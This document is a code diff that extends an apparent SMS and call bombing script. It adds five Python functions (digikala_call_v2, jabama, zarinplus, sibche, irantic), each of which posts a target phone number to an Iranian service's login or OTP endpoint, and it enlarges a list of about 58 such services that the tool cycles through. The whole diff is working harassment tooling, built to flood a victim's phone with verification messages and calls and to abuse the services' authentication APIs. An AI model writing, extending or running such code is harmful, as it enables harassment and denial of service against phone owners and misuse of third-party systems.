@@ -878,22 +878,111 @@ def abantether(phone):
 
 
 
+def digikala_call_v2(phone):
+    url = "https://api.digikala.com/v1/user/authenticate/"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://www.digikala.com",
+        "Referer": "https://www.digikala.com/"
+    }
+    data = {
+        "backUrl": "/",
+        "username": phone,
+        "otp_call": "true"
+    }
+    try:
+        r = requests.post(url, headers=headers, json=data, timeout=10)
+        return r.status_code == 200
+    except:
+        return False
+
+
+
+def jabama(phone):
+    import requests
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    url = "https://gw.jabama.com/api/v4/account/send-code"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
+    try:
+        return requests.post(url, headers=headers, json={"mobile": phone}, timeout=10).status_code == 200
+    except: return False
+
+
+def zarinplus(phone):
+    import requests
+    phone = phone.split('+98')[-1].split('98')[-1]
+    if phone.startswith('0'): phone = phone[1:]
+    url = "https://api.zarinplus.com/user/zarinpal-login"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
+    try:
+        return requests.post(url, headers=headers, json={"phone_number": f"98{phone}"}, timeout=10).status_code == 200
+    except: return False
+
+
+
+
+
+def sibche(phone):
+    import requests
+    phone = '0' + ''.join(filter(str.isdigit, str(phone)))[-10:]
+    url = "https://api.sibche.com/profile/sendCode"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+    }
+    try:
+        r = requests.post(url, json={"mobile": phone}, headers=headers, timeout=10)
+        return r.status_code, r.json()
+    except Exception as e:
+        return None, {"error": str(e)}
+
+
+
+
+def irantic(phone):
+    import requests
+    phone = '0' + ''.join(filter(str.isdigit, str(phone)))[-10:]
+    url = "https://www.irantic.com/api/login/request"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Origin": "https://www.irantic.com",
+        "Referer": "https://www.irantic.com/"
+    }
+    try:
+        r = requests.post(url, json={"mobile": phone}, headers=headers, timeout=10)
+        return r.status_code, r.json()
+    except: return None, {"error": "request failed"}
+
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
     abantether, accounts1606, achareh, activecleaners, alldigitall,
-    alopeyk_safir, alldigitall, ompfinex, arzplus, arzunex,
-    azkivam, azno, basalam, bimeh, bimehland,
-    bimeparsian, bornosmode, cartesabz, chapmatin, charsooq,
-    darunet, dgshahr, didar24, digikala, divar,
-    drto, ebimename, gap, ibime, karnameh,
-    khodro45, masterkala, mek, milli_gold, motorbargh,
-    mydigipay, okala, otaghak, padmira, pinket,
-    pindo, raheeno, riiha, sarmayex,
-    shahrfarsh, sheypoor, sibapp, t4f, tetherland,
-    theshoes, twox, ubitex, vakiljo
+    alldigitall, alopeyk_safir, arzplus, arzunex, azkivam,
+    azno, basalam, bimeh, bimehland, bimeparsian,
+    bornosmode, cartesabz, chapmatin, charsooq, darunet,
+    dgshahr, didar24, digikala, digikala_call_v2, divar,
+    drto, ebimename, gap, ibime, irantic,
+    jabama, karnameh, khodro45, masterkala, mek,
+    milli_gold, motorbargh, mydigipay, okala, ompfinex,
+    otaghak, padmira, pinket, pindo, raheeno,
+    riiha, sarmayex, shahrfarsh, sheypoor, sibapp,
+    sibche, t4f, tetherland, theshoes, twox,
+    ubitex, vakiljo, zarinplus
 ]
+
 
 
 
